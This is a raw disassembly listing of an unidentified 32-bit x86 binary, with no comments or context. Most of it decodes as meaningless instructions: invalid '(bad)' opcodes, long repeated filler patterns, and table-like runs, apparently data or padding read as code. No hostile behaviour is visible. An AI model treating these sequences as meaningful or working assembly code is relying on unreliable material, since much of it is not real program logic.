  419df4:	pop    ss
  419df5:	push   esi
  419df6:	xor    DWORD PTR [edi],eax
  419df8:	push   edx
  419df9:	jmp    DWORD PTR ds:0x15e58953
  419dff:	dec    edx
  419e00:	int3   
  419e01:	int3   
  419e02:	lds    eax,FWORD PTR [ecx+0x2b5483ec]
  419e08:	lds    eax,FWORD PTR [ebp+0x58]
  419e0b:	pop    es
  419e0c:	add    BYTE PTR [eax],al
  419e0e:	lock dec ebp
  419e10:	inc    ebx
  419e11:	fmul   st(0),st
  419e13:	push   es
  419e14:	add    BYTE PTR [eax],al
  419e16:	das    
  419e17:	int3   
  419e18:	repz add eax,esi
  419e1b:	push   es
  419e1c:	add    bh,al
  419e1e:	lods   eax,DWORD PTR ds:[esi]
  419e1f:	push   edx
  419e20:	add    BYTE PTR [eax],al
  419e22:	lock push es
  419e24:	lds    eax,FWORD PTR [ebp+0xc]
  419e27:	pop    es
  419e28:	add    BYTE PTR [eax],al
  419e2a:	lock or DWORD PTR [ebx+0x8],0x55f00469
	...
  419e42:	add    BYTE PTR [eax],al
  419e44:	mov    cl,0x6
  419e46:	call   0xfd979df4
  419e4b:	mov    eax,ds:0x3ebc00
  419e50:	int    0x55
  419e52:	std    
  419e53:	add    al,dh
  419e55:	fimul  DWORD PTR [ebx]
  419e57:	(bad)  
  419e58:	in     eax,dx
  419e59:	dec    esi
  419e5a:	push   ebx
  419e5b:	inc    ecx
  419e5c:	lock push es
  419e5e:	add    BYTE PTR [eax],al
  419e60:	lock popa 
  419e62:	or     al,bh
  419e64:	cmc    
  419e65:	dec    esi
  419e66:	push   ebx
  419e67:	inc    ecx
  419e68:	lock pop es
  419e6a:	add    BYTE PTR [eax],al
  419e6c:	lock mov DWORD PTR [ebx],edi
  419e6f:	lock sbb eax,0x25ffffc8
  419e75:	add    ebp,eax
  419e77:	add    eax,0x3ebba8
  419e7c:	lock push es
  419e7e:	add    BYTE PTR [eax],al
  419e80:	jae    0x419e95
  419e82:	clc    
  419e83:	push   ebp
  419e84:	xor    DWORD PTR [edi],eax
  419e86:	add    BYTE PTR [ebp-0xb],dh
  419e89:	loopne 0x419e8a
  419e8b:	(bad)  
  419e8c:	in     eax,0x46
  419e8e:	push   ebx
  419e8f:	inc    ecx
  419e90:	lock test eax,0x6b155f0
  419e96:	mov    DWORD PTR ds:0x3ebb60,ecx
  419e9c:	imul   eax,ebx,0x56fd8be7
  419ea2:	push   ebx
  419ea3:	inc    ecx
  419ea4:	lock add DWORD PTR [ebx-0x18],0x0
	...
  419eb8:	add    BYTE PTR [eax],al
  419eba:	repz enter 0x893b,0xb5
  419ebf:	pop    esi
  419ec0:	mov    DWORD PTR [ebp+0x48],ecx
  419ec3:	jg     0x419ed0
  419ec5:	fadd   st(5),st
  419ec7:	(bad)  
  419ec8:	jmp    DWORD PTR [edi-0x40]
  419ecb:	or     DWORD PTR [eax+0x0],eax
  419ece:	pop    ds
  419ecf:	sti    
  419ed0:	mov    edi,0xa106b155
  419ed5:	cld    
  419ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed7:	(bad)  
  419ed8:	inc    esi
  419eda:	in     eax,dx
  419edb:	add    dl,BYTE PTR [esi+0x41]
  419ede:	lock fild DWORD PTR [eax]
  419ee1:	inc    eax
  419ee2:	lock ficomp WORD PTR [edi+0x3]
  419ee6:	xor    BYTE PTR [edi],al
  419ee8:	mov    DWORD PTR ds:0x3ebae4,edx
  419eee:	inc    edx
  419eef:	pop    edi
  419ef0:	ret    0xd7f7
  419ef3:	push   esp
  419ef4:	add    esp,0x5608a7f8
  419efa:	xor    DWORD PTR [edi],eax
  419efc:	std    
  419efd:	adc    eax,0x3ebce8
  419f02:	xchg   ebx,eax
  419f03:	out    dx,eax
  419f04:	push   ebp
  419f05:	inc    ecx
  419f06:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f08:	or     al,0x56
  419f0a:	xor    DWORD PTR [edi],eax
  419f0c:	push   eax
  419f0d:	call   0x3ef476
  419f12:	jae    0x419f5f
  419f14:	add    al,0x89
  419f16:	xor    eax,0x804d8957
  419f1b:	mov    dh,0xe7
  419f1d:	aad    0x0
	...
  419f2f:	add    BYTE PTR [esi+0x54],bh
  419f32:	std    
  419f33:	sub    DWORD PTR [ebx+ecx*1-0x3a3a0b5f],0xffffffff
  419f3b:	mov    bh,BYTE PTR [ebp-0xf95adaa]
  419f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f42:	hlt    
  419f43:	push   ebp
  419f44:	mov    cl,0x6
  419f46:	push   eax
  419f47:	call   0x3efbb8
  419f4c:	jae    0x419f99
  419f4e:	or     al,0x8b
  419f50:	lods   eax,DWORD PTR ds:[esi]
  419f51:	push   esi
  419f52:	xchg   DWORD PTR [ebp+0x50],ecx
  419f55:	adc    BYTE PTR [ebx-0x4],0xeb
  419f59:	mov    ecx,0x7fca73ef
  419f5e:	inc    ebx
  419f5f:	loopne 0x419f21
  419f61:	jg     0x419fae
  419f63:	fadd   st(1),st
  419f65:	pop    esi
  419f66:	scas   al,BYTE PTR es:[edi]
  419f67:	sti    
  419f68:	andps  xmm0,XMMWORD PTR [ecx+0xa7f8c4]
  419f6f:	push   esi
  419f70:	mov    cl,0x6
  419f72:	mov    DWORD PTR ds:0x3ebcf0,edx
  419f78:	inc    edx
  419f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f7a:	or     al,0x56
  419f7c:	xor    DWORD PTR [edi],eax
  419f7e:	add    DWORD PTR [ebp-0x2c],eax
  419f81:	mov    dh,0x88
  419f83:	or     eax,0x3eb9dc
  419f88:	repz sar ebx,0x51
  419f8c:	fdivr  DWORD PTR [ebx]
  419f8e:	idiv   edi
  419f90:	mov    edi,0xcc487
	...
  419fa5:	add    BYTE PTR [ebx-0x47],ch
  419fa8:	repz add eax,DWORD PTR [ebp+0x33]
  419fac:	add    DWORD PTR [ebp-0x74],edx
  419faf:	jge    0x41a004
  419fb1:	in     al,0x6b
  419fb3:	leave  
  419fb4:	sti    
  419fb5:	add    ebp,DWORD PTR ds:0x8c458733
  419fbb:	jg     0x41a008
  419fbd:	loopne 0x419f9a
  419fbf:	add    DWORD PTR [eax],eax
  419fc1:	push   esi
  419fc2:	xor    DWORD PTR [edi],eax
  419fc4:	xchg   DWORD PTR [ebp-0x70],ecx
  419fc7:	pop    edi
  419fc8:	sahf   
  419fc9:	(bad)  
  419fca:	mov    ch,0x4e
  419fcc:	add    BYTE PTR [eax],al
  419fce:	lock push es
  419fd0:	jmp    0xf7fb0ade
  419fd5:	xor    DWORD PTR [edx],0xa
  419fd8:	xchg   DWORD PTR [ebp+0x48],edx
  419fdb:	jg     0x41a020
  419fdd:	clc    
  419fde:	or     ecx,edx
  419fe0:	out    dx,eax
  419fe1:	jae    0x419fdb
  419fe3:	jg     0x419ff0
  419fe5:	hlt    
  419fe6:	popf   
  419fe7:	(bad)  
  419fea:	mov    ebp,0xf311894e
  419fef:	mov    ecx,0xb924a1f7
  419ff4:	ds add bl,dh
  419ff7:	leave  
  419ff8:	test   DWORD PTR [ecx-0x7b48020],0x3e74571
  41a002:	lock push es
  41a004:	mov    DWORD PTR ds:0x3eb8fc,edx
	...
  41a01a:	add    BYTE PTR [eax],al
  41a01c:	repz mov ebx,0xa7fa33f7
  41a022:	hlt    
  41a023:	push   ebp
  41a024:	xor    DWORD PTR [edi],eax
  41a026:	add    DWORD PTR [ebp-0x28],eax
  41a029:	or     BYTE PTR [eax],0xeb
  41a02c:	xchg   DWORD PTR [eax-0x37e21bd5],eax
  41a032:	dec    DWORD PTR [eax+0x415366fd]
  41a038:	lock adc eax,0x2ee589c7
  41a03e:	push   ebx
  41a03f:	inc    ecx
  41a040:	lock adc eax,0x62fd89c7
  41a046:	push   ebx
  41a047:	inc    ecx
  41a048:	lock pop esi
  41a04a:	dec    esi
  41a04b:	test   DWORD PTR [edi+0x170d8b52],0x69003ebc
  41a055:	(bad)  
  41a056:	idiv   DWORD PTR [ecx+0x4004f0]
  41a05c:	jno    0x41a0be
  41a05e:	add    BYTE PTR [edx],al
  41a060:	lock push es
  41a062:	mov    DWORD PTR [ebp+0x58],edx
  41a065:	push   ds
  41a066:	iret   
  41a067:	mov    ebp,edi
  41a069:	pop    esi
  41a06a:	push   ebx
  41a06b:	inc    ecx
  41a06c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a06e:	call   0x504851c8
  41a073:	call   0x3eed6c
  41a078:	jae    0x41a0c5
  41a07a:	add    al,0x8b
  41a07c:	std    
  41a07d:	pop    edx
  41a07e:	push   ebx
  41a07f:	inc    ecx
	...
  41a090:	add    BYTE PTR [eax],al
  41a092:	lock mov bh,0xe7
  41a095:	aad    0x1a
  41a097:	push   edx
  41a098:	std    
  41a099:	test   DWORD PTR [eax],esi
  41a09b:	fadd   QWORD PTR [ebx]
  41a09d:	xor    esi,DWORD PTR [eax]
  41a09f:	pop    esi
  41a0a0:	sub    cl,BYTE PTR [ebx+0x41536acd]
  41a0a6:	lock test esp,eax
  41a0a9:	add    al,0x73
  41a0ab:	adc    al,0xf8
  41a0ad:	push   ebp
  41a0ae:	xor    DWORD PTR [edi],eax
  41a0b0:	add    BYTE PTR [ecx+edi*8-0x59],dh
  41a0b4:	aam    0x55
  41a0b6:	xor    DWORD PTR [edi],eax
  41a0b8:	xchg   DWORD PTR [esp+ecx*1+0xb],eax
  41a0bc:	call   0xfd936e1e
  41a0c1:	mov    ebx,ebp
  41a0c3:	cli    
  41a0c4:	push   ebp
  41a0c5:	inc    ecx
  41a0c6:	lock mov ah,0xc0
  41a0c9:	xor    esi,DWORD PTR [eax-0x4ca21c83]
  41a0cf:	inc    edx
  41a0d0:	int3   
  41a0d1:	int3   
  41a0d2:	lock push es
  41a0d4:	add    BYTE PTR [eax],al
  41a0d6:	lock push es
  41a0d8:	add    BYTE PTR [eax],al
  41a0da:	lock push es
  41a0dc:	add    BYTE PTR [eax],al
  41a0de:	lock push es
  41a0e0:	add    BYTE PTR [eax],al
  41a0e2:	lock push es
  41a0e4:	add    BYTE PTR [eax],al
  41a0e6:	lock push es
  41a0e8:	add    BYTE PTR [eax],al
  41a0ea:	lock push es
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	lock push es
  41a0f0:	add    BYTE PTR [eax],al
  41a0f2:	lock push es
	...
  41a108:	lock push es
  41a10a:	add    BYTE PTR [eax],al
  41a10c:	lock push es
  41a10e:	add    BYTE PTR [eax],al
  41a110:	lock push es
  41a112:	add    BYTE PTR [eax],al
  41a114:	lock push es
  41a116:	add    BYTE PTR [eax],al
  41a118:	lock push es
  41a11a:	add    BYTE PTR [eax],al
  41a11c:	lock push es
  41a11e:	add    BYTE PTR [eax],al
  41a120:	lock push es
  41a122:	add    BYTE PTR [eax],al
  41a124:	lock push es
  41a126:	add    BYTE PTR [eax],al
  41a128:	lock push es
  41a12a:	add    BYTE PTR [eax],al
  41a12c:	lock push es
  41a12e:	add    BYTE PTR [eax],al
  41a130:	lock push es
  41a132:	add    BYTE PTR [eax],al
  41a134:	lock push es
  41a136:	add    BYTE PTR [eax],al
  41a138:	lock push es
  41a13a:	add    BYTE PTR [eax],al
  41a13c:	lock push es
  41a13e:	add    BYTE PTR [eax],al
  41a140:	lock push es
  41a142:	add    BYTE PTR [eax],al
  41a144:	lock push es
  41a146:	add    BYTE PTR [eax],al
  41a148:	lock push es
  41a14a:	add    BYTE PTR [eax],al
  41a14c:	lock push es
  41a14e:	add    BYTE PTR [eax],al
  41a150:	lock push es
  41a152:	add    BYTE PTR [eax],al
  41a154:	lock push es
  41a156:	add    BYTE PTR [eax],al
  41a158:	lock push es
  41a15a:	add    BYTE PTR [eax],al
  41a15c:	lock push es
  41a15e:	add    BYTE PTR [eax],al
  41a160:	lock push es
  41a162:	add    BYTE PTR [eax],al
  41a164:	lock push es
  41a166:	add    BYTE PTR [eax],al
  41a168:	lock push es
	...
  41a17e:	lock push es
  41a180:	add    BYTE PTR [eax],al
  41a182:	lock push es
  41a184:	add    BYTE PTR [eax],al
  41a186:	lock push es
  41a188:	add    BYTE PTR [eax],al
  41a18a:	lock push es
  41a18c:	add    BYTE PTR [eax],al
  41a18e:	lock push es
  41a190:	add    BYTE PTR [eax],al
  41a192:	lock push es
  41a194:	add    BYTE PTR [eax],al
  41a196:	lock push es
  41a198:	add    BYTE PTR [eax],al
  41a19a:	lock push es
  41a19c:	add    BYTE PTR [eax],al
  41a19e:	lock push es
  41a1a0:	add    BYTE PTR [eax],al
  41a1a2:	lock push es
  41a1a4:	add    BYTE PTR [eax],al
  41a1a6:	lock push es
  41a1a8:	add    BYTE PTR [eax],al
  41a1aa:	lock push es
  41a1ac:	add    BYTE PTR [eax],al
  41a1ae:	lock push es
  41a1b0:	add    BYTE PTR [eax],al
  41a1b2:	lock push es
  41a1b4:	add    BYTE PTR [eax],al
  41a1b6:	lock push es
  41a1b8:	add    BYTE PTR [eax],al
  41a1ba:	lock push es
  41a1bc:	add    BYTE PTR [eax],al
  41a1be:	lock push es
  41a1c0:	add    BYTE PTR [eax],al
  41a1c2:	lock push es
  41a1c4:	add    BYTE PTR [eax],al
  41a1c6:	lock push es
  41a1c8:	add    BYTE PTR [eax],al
  41a1ca:	lock push es
  41a1cc:	add    BYTE PTR [eax],al
  41a1ce:	lock push es
  41a1d0:	add    BYTE PTR [eax],al
  41a1d2:	lock push es
  41a1d4:	add    BYTE PTR [eax],al
  41a1d6:	lock push es
  41a1d8:	add    BYTE PTR [eax],al
  41a1da:	lock push es
  41a1dc:	add    BYTE PTR [eax],al
  41a1de:	lock push es
	...
  41a1f4:	lock push es
  41a1f6:	add    BYTE PTR [eax],al
  41a1f8:	lock push es
  41a1fa:	add    BYTE PTR [eax],al
  41a1fc:	lock push es
  41a1fe:	add    BYTE PTR [eax],al
  41a200:	lock push es
  41a202:	add    BYTE PTR [eax],al
  41a204:	lock push es
  41a206:	add    BYTE PTR [eax],al
  41a208:	lock push es
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	lock push es
  41a20e:	add    BYTE PTR [eax],al
  41a210:	lock push es
  41a212:	add    BYTE PTR [eax],al
  41a214:	lock push es
  41a216:	add    BYTE PTR [eax],al
  41a218:	lock push es
  41a21a:	add    BYTE PTR [eax],al
  41a21c:	lock push es
  41a21e:	add    BYTE PTR [eax],al
  41a220:	lock push es
  41a222:	add    BYTE PTR [eax],al
  41a224:	lock push es
  41a226:	add    BYTE PTR [eax],al
  41a228:	lock push es
  41a22a:	add    BYTE PTR [eax],al
  41a22c:	lock push es
  41a22e:	add    BYTE PTR [eax],al
  41a230:	lock push es
  41a232:	add    BYTE PTR [eax],al
  41a234:	lock push es
  41a236:	add    BYTE PTR [eax],al
  41a238:	lock push es
  41a23a:	add    BYTE PTR [eax],al
  41a23c:	lock push es
  41a23e:	add    BYTE PTR [eax],al
  41a240:	lock push es
  41a242:	add    BYTE PTR [eax],al
  41a244:	lock push es
  41a246:	add    BYTE PTR [eax],al
  41a248:	lock push es
  41a24a:	add    BYTE PTR [eax],al
  41a24c:	lock push es
  41a24e:	add    BYTE PTR [eax],al
  41a250:	lock push es
  41a252:	add    BYTE PTR [eax],al
  41a254:	add    BYTE PTR [edx],al
  41a256:	add    BYTE PTR [eax],al
  41a258:	lock push es
  41a25a:	add    BYTE PTR [eax],al
  41a25c:	call   0x6c41a267
  41a261:	xor    al,0x90
  41a263:	xor    bl,BYTE PTR [esp+esi*1-0x68]
  41a267:	xor    cl,BYTE PTR [ebp+esi*1+0x358c32a0]
  41a26e:	test   al,0x32
  41a270:	lock inc esi
  41a272:	add    DWORD PTR [eax],eax
  41a274:	inc    eax
  41a275:	pop    es
  41a276:	add    BYTE PTR [eax],al
  41a278:	sar    DWORD PTR ds:0x3c203b4b,cl
  41a27e:	pop    edx
  41a27f:	cmp    ebx,DWORD PTR [edi]
  41a281:	cmp    al,0x68
  41a283:	cmp    eax,DWORD PTR [esi+0x3c]
  41a286:	xchg   ebx,eax
  41a287:	cmp    ecx,DWORD PTR [esi-0x53c457c4]
  41a28d:	cmp    al,0xed
  41a28f:	cmp    ebp,ebx
  41a291:	cmp    dl,BYTE PTR [ecx]
  41a293:	cmp    al,0xf9
  41a295:	cmp    bl,BYTE PTR [ebp-0x78c5abc4]
  41a29b:	ds jne 0x41a2d7
  41a29e:	xchg   ebp,eax
  41a29f:	ds mov ah,0x39
  41a2a2:	int    0x3e
  41a2a4:	(bad)  
  41a2a5:	cmp    DWORD PTR [esi+0x3f],edi
  41a2a8:	jae    0x41a2e2
  41a2aa:	fwait
  41a2ab:	aas    
  41a2ac:	cdq    
  41a2ad:	cmp    BYTE PTR [edi-0x33c760c1],ch
  41a2b3:	aas    
  41a2b4:	inc    edx
  41a2b5:	cmp    dh,ah
  41a2b7:	aas    
  41a2b8:	inc    ecx
  41a2b9:	cmp    cl,bh
  41a2bb:	aas    
	...
  41a2cc:	add    BYTE PTR [eax],al
  41a2ce:	inc    edi
  41a2cf:	cmp    BYTE PTR [eax],al
  41a2d1:	add    al,dh
  41a2d3:	push   esi
  41a2d4:	add    DWORD PTR [eax],eax
  41a2d6:	jl     0x41a2df
  41a2d8:	add    BYTE PTR [eax],al
  41a2da:	cmc    
  41a2db:	sbb    BYTE PTR ss:[eax],dh
  41a2de:	jno    0x41a317
  41a2e0:	xchg   DWORD PTR [eax],esi
  41a2e2:	mov    dh,0x35
  41a2e4:	dec    ebx
  41a2e5:	xor    DWORD PTR [ebp-0x7fce99cb],esi
  41a2eb:	xor    eax,0x364c318d
  41a2f0:	stos   BYTE PTR es:[edi],al
  41a2f1:	xor    DWORD PTR [edx],esi
  41a2f3:	ss loope 0x41a327
  41a2f6:	out    0x34,al
  41a2f8:	pop    ss
  41a2f9:	xor    cl,BYTE PTR [esi*1+0x35293223]
  41a300:	inc    edx
  41a301:	xor    ch,BYTE PTR [eax]
  41a303:	xor    eax,0x353f3251
  41a308:	pop    esi
  41a309:	xor    bl,BYTE PTR [ebp+0x35]
  41a30c:	jge    0x41a340
  41a30e:	jb     0x41a344
  41a310:	xchg   esp,eax
  41a311:	xor    bl,BYTE PTR [ebp+0x34]
  41a314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a315:	xor    bh,BYTE PTR [esi+0x34]
  41a318:	ret    0xc032
  41a31b:	xor    al,0x8
  41a31d:	xor    esi,esi
  41a31f:	xor    edx,DWORD PTR [ebx+esi*1]
  41a322:	aad    0x33
  41a324:	sub    dh,BYTE PTR [ebx]
  41a326:	xor    dh,BYTE PTR [esi+edi*2]
  41a329:	xor    edi,DWORD PTR [eax+0x33]
  41a32c:	xchg   ebp,eax
  41a32d:	xor    edx,DWORD PTR [ecx+0x33]
  41a330:	stos   DWORD PTR es:[edi],eax
  41a331:	xor    eax,DWORD PTR [eax]
	...
  41a343:	add    BYTE PTR [ebx+esi*1-0x42],al
  41a347:	xor    ebp,DWORD PTR [ecx+0x4433ce33]
  41a34d:	xor    ebx,ebp
  41a34f:	xor    edx,DWORD PTR [edi+0x33]
  41a352:	hlt    
  41a353:	xor    ebx,DWORD PTR [edx+0x33]
  41a356:	push   DWORD PTR [ebx]
  41a358:	in     eax,dx
  41a359:	xor    cl,BYTE PTR [ecx]
  41a35b:	xor    al,0xfe
  41a35d:	xor    dl,BYTE PTR [esp+esi*1]
  41a360:	adc    dh,BYTE PTR [ebx]
  41a362:	sub    BYTE PTR [ecx*1-0x58cbcdcd],dh
  41a369:	xor    bl,BYTE PTR [edx+0x34]
  41a36c:	jbe    0x41a3a0
  41a36e:	mov    WORD PTR [edx+eax*4],?
  41a371:	xor    bl,BYTE PTR [esp+esi*1+0x34eb3236]
  41a378:	sbb    BYTE PTR [edx],dh
  41a37a:	or     al,0x35
  41a37c:	out    0x31,al
  41a37e:	and    esi,DWORD PTR ds:0x353131d9
  41a384:	mov    ecx,0xa4354431
  41a389:	xor    DWORD PTR [ebp+0x35],ebx
  41a38c:	push   edx
  41a38d:	cmp    al,0x71
  41a38f:	xor    eax,0x358e3c6d
  41a394:	xchg   BYTE PTR [eiz*4+0x6f035],bh
  41a39b:	add    al,dh
  41a39d:	push   es
  41a39e:	add    BYTE PTR [eax],al
  41a3a0:	lock push es
  41a3a2:	add    BYTE PTR [eax],al
  41a3a4:	lock push es
	...
  41a3ba:	lock push es
  41a3bc:	add    BYTE PTR [eax],al
  41a3be:	lock push es
  41a3c0:	add    BYTE PTR [eax],al
  41a3c2:	lock push es
  41a3c4:	add    BYTE PTR [eax],al
  41a3c6:	lock push es
  41a3c8:	add    BYTE PTR [eax],al
  41a3ca:	lock push es
  41a3cc:	add    BYTE PTR [eax],al
  41a3ce:	lock push es
  41a3d0:	add    BYTE PTR [eax],al
  41a3d2:	lock push es
  41a3d4:	add    BYTE PTR [eax],al
  41a3d6:	lock push es
  41a3d8:	add    BYTE PTR [eax],al
  41a3da:	lock push es
  41a3dc:	add    BYTE PTR [eax],al
  41a3de:	lock push es
  41a3e0:	add    BYTE PTR [eax],al
  41a3e2:	lock push es
  41a3e4:	add    BYTE PTR [eax],al
  41a3e6:	lock push es
  41a3e8:	add    BYTE PTR [eax],al
  41a3ea:	lock push es
  41a3ec:	add    BYTE PTR [eax],al
  41a3ee:	lock push es
  41a3f0:	add    BYTE PTR [eax],al
  41a3f2:	lock push es
  41a3f4:	add    BYTE PTR [eax],al
  41a3f6:	lock push es
  41a3f8:	add    BYTE PTR [eax],al
  41a3fa:	lock push es
  41a3fc:	add    BYTE PTR [eax],al
  41a3fe:	lock push es
  41a400:	add    BYTE PTR [eax],al
  41a402:	lock push es
  41a404:	add    BYTE PTR [eax],al
  41a406:	lock push es
  41a408:	add    BYTE PTR [eax],al
  41a40a:	lock push es
  41a40c:	add    BYTE PTR [eax],al
  41a40e:	lock push es
  41a410:	add    BYTE PTR [eax],al
  41a412:	lock push es
  41a414:	add    BYTE PTR [eax],al
  41a416:	lock push es
  41a418:	add    BYTE PTR [eax],al
  41a41a:	lock push es
	...
  41a430:	lock push es
  41a432:	add    BYTE PTR [eax],al
  41a434:	lock push es
  41a436:	add    BYTE PTR [eax],al
  41a438:	lock push es
  41a43a:	add    BYTE PTR [eax],al
  41a43c:	lock push es
  41a43e:	add    BYTE PTR [eax],al
  41a440:	lock push es
  41a442:	add    BYTE PTR [eax],al
  41a444:	lock push es
  41a446:	add    BYTE PTR [eax],al
  41a448:	lock push es
  41a44a:	add    BYTE PTR [eax],al
  41a44c:	lock push es
  41a44e:	add    BYTE PTR [eax],al
  41a450:	lock push es
  41a452:	add    BYTE PTR [eax],al
  41a454:	lock push es
  41a456:	add    BYTE PTR [eax],al
  41a458:	lock push es
  41a45a:	add    BYTE PTR [eax],al
  41a45c:	lock push es
  41a45e:	add    BYTE PTR [eax],al
  41a460:	lock push es
  41a462:	add    BYTE PTR [eax],al
  41a464:	lock push es
  41a466:	add    BYTE PTR [eax],al
  41a468:	lock push es
  41a46a:	add    BYTE PTR [eax],al
  41a46c:	lock push es
  41a46e:	add    BYTE PTR [eax],al
  41a470:	lock push es
  41a472:	add    BYTE PTR [eax],al
  41a474:	lock push es
  41a476:	add    BYTE PTR [eax],al
  41a478:	lock push es
  41a47a:	add    BYTE PTR [eax],al
  41a47c:	lock push es
  41a47e:	add    BYTE PTR [eax],al
  41a480:	lock push es
  41a482:	add    BYTE PTR [eax],al
  41a484:	lock push es
  41a486:	add    BYTE PTR [eax],al
  41a488:	lock push es
  41a48a:	add    BYTE PTR [eax],al
  41a48c:	lock push es
  41a48e:	add    BYTE PTR [eax],al
  41a490:	lock push es
	...
  41a4a6:	lock push es
  41a4a8:	add    BYTE PTR [eax],al
  41a4aa:	lock push es
  41a4ac:	add    BYTE PTR [eax],al
  41a4ae:	lock push es
  41a4b0:	add    BYTE PTR [eax],al
  41a4b2:	lods   al,BYTE PTR ds:[esi]
  41a4b3:	fiadd  DWORD PTR [ecx+0x0]
  41a4b6:	mov    al,0xda
  41a4b8:	inc    ecx
  41a4b9:	add    BYTE PTR [edx+ebx*8-0x2547ffbf],dh
  41a4c0:	inc    ecx
  41a4c1:	add    BYTE PTR [edx+ebx*8-0x253fffbf],bh
  41a4c8:	inc    ecx
  41a4c9:	add    ah,al
  41a4cb:	fiadd  DWORD PTR [ecx+0x0]
  41a4ce:	enter  0x41da,0x0
  41a4d2:	int3   
  41a4d3:	fiadd  DWORD PTR [ecx+0x0]
  41a4d6:	rcr    dl,1
  41a4d8:	inc    ecx
  41a4d9:	add    ah,dl
  41a4db:	fiadd  DWORD PTR [ecx+0x0]
  41a4de:	fcomp  st(2)
  41a4e0:	inc    ecx
  41a4e1:	add    ah,bl
  41a4e3:	fiadd  DWORD PTR [ecx+0x0]
  41a4e6:	loopne 0x41a4c2
  41a4e8:	inc    ecx
  41a4e9:	add    ah,ah
  41a4eb:	fiadd  DWORD PTR [ecx+0x0]
  41a4ee:	call   0xec41e6cd
  41a4f3:	fiadd  DWORD PTR [ecx+0x0]
  41a4f6:	lock fiadd DWORD PTR [ecx+0x0]
  41a4fa:	hlt    
  41a4fb:	fiadd  DWORD PTR [ecx+0x0]
  41a4fe:	clc    
  41a4ff:	fiadd  DWORD PTR [ecx+0x0]
  41a502:	cld    
  41a503:	fiadd  DWORD PTR [ecx+0x0]
  41a506:	add    bl,bl
  41a508:	inc    ecx
  41a509:	add    BYTE PTR [ebx+ebx*8],al
  41a50c:	inc    ecx
  41a50d:	add    BYTE PTR [eax],cl
  41a50f:	fild   DWORD PTR [ecx+0x0]
  41a512:	or     al,0xdb
  41a514:	inc    ecx
  41a515:	add    BYTE PTR [eax],dl
  41a517:	fild   DWORD PTR [ecx+0x0]
  41a51a:	adc    al,0xdb
  41a51c:	inc    ecx
  41a51d:	add    BYTE PTR [eax],bl
  41a51f:	fild   DWORD PTR [ecx+0x0]
  41a522:	sbb    al,0xdb
  41a524:	inc    ecx
  41a525:	add    BYTE PTR [eax],ah
  41a527:	fild   DWORD PTR [ecx+0x0]
  41a52a:	and    al,0xdb
  41a52c:	inc    ecx
  41a52d:	add    BYTE PTR [eax],ch
  41a52f:	fild   DWORD PTR [ecx+0x0]
  41a532:	sub    al,0xdb
  41a534:	inc    ecx
  41a535:	add    BYTE PTR [eax],dh
  41a537:	fild   DWORD PTR [ecx+0x0]
  41a53a:	xor    al,0xdb
  41a53c:	inc    ecx
  41a53d:	add    BYTE PTR [eax],bh
  41a53f:	fild   DWORD PTR [ecx+0x0]
  41a542:	cmp    al,0xdb
  41a544:	inc    ecx
  41a545:	add    BYTE PTR [eax-0x25],al
  41a548:	inc    ecx
  41a549:	add    BYTE PTR [ebx+ebx*8+0x41],al
  41a54d:	add    BYTE PTR [edx+ebx*8-0x24b7ffbf],ch
  41a554:	inc    ecx
  41a555:	add    BYTE PTR [ebx+ebx*8+0x41],cl
  41a559:	add    BYTE PTR [eax-0x25],dl
  41a55c:	inc    ecx
  41a55d:	add    BYTE PTR [ebx+ebx*8+0x41],dl
  41a561:	add    BYTE PTR [eax-0x25],bl
  41a564:	inc    ecx
  41a565:	add    BYTE PTR [ebx+ebx*8+0x41],bl
  41a569:	add    BYTE PTR [eax-0x25],ah
  41a56c:	inc    ecx
  41a56d:	add    BYTE PTR [ebx+ebx*8+0x41],ah
  41a571:	add    BYTE PTR [eax-0x25],ch
  41a574:	inc    ecx
  41a575:	add    BYTE PTR [ebx+ebx*8+0x41],ch
  41a579:	add    BYTE PTR [eax-0x25],dh
  41a57c:	inc    ecx
  41a57d:	add    BYTE PTR [ebx+ebx*8+0x41],dh
  41a581:	add    BYTE PTR [eax-0x25],bh
  41a584:	inc    ecx
  41a585:	add    BYTE PTR [ebx+ebx*8+0x41],bh
  41a589:	add    BYTE PTR [eax-0x7bffbe25],al
  41a58f:	fild   DWORD PTR [ecx+0x0]
  41a592:	mov    bl,bl
  41a594:	inc    ecx
  41a595:	add    BYTE PTR [ebx+ebx*8-0x246fffbf],cl
  41a59c:	inc    ecx
  41a59d:	add    BYTE PTR [ebx+ebx*8-0x2467ffbf],dl
  41a5a4:	inc    ecx
  41a5a5:	add    BYTE PTR [ebx+ebx*8-0x245fffbf],bl
  41a5ac:	inc    ecx
  41a5ad:	add    BYTE PTR [ebx+ebx*8-0x2457ffbf],ah
  41a5b4:	inc    ecx
  41a5b5:	add    BYTE PTR [ebx+ebx*8-0x244fffbf],ch
  41a5bc:	inc    ecx
  41a5bd:	add    BYTE PTR [ebx+ebx*8-0x2447ffbf],dh
  41a5c4:	inc    ecx
  41a5c5:	add    BYTE PTR [ebx+ebx*8-0x243fffbf],bh
  41a5cc:	inc    ecx
  41a5cd:	add    ah,al
  41a5cf:	fild   DWORD PTR [ecx+0x0]
  41a5d2:	enter  0x41db,0x0
  41a5d6:	int3   
  41a5d7:	fild   DWORD PTR [ecx+0x0]
  41a5da:	rcr    bl,1
  41a5dc:	inc    ecx
  41a5dd:	add    ah,dl
  41a5df:	fild   DWORD PTR [ecx+0x0]
  41a5e2:	fcomp  st(3)
  41a5e4:	inc    ecx
  41a5e5:	add    ah,bl
  41a5e7:	fild   DWORD PTR [ecx+0x0]
  41a5ea:	loopne 0x41a5c7
  41a5ec:	inc    ecx
  41a5ed:	add    ah,ah
  41a5ef:	fild   DWORD PTR [ecx+0x0]
  41a5f2:	call   0xec41e7d2
  41a5f7:	fild   DWORD PTR [ecx+0x0]
  41a5fa:	lock fild DWORD PTR [ecx+0x0]
  41a5fe:	aam    0xdb
  41a600:	inc    ecx
  41a601:	add    ah,dh
  41a603:	fild   DWORD PTR [ecx+0x0]
  41a606:	clc    
  41a607:	fild   DWORD PTR [ecx+0x0]
  41a60a:	pushf  
  41a60b:	fild   DWORD PTR [ecx+0x0]
  41a60e:	cld    
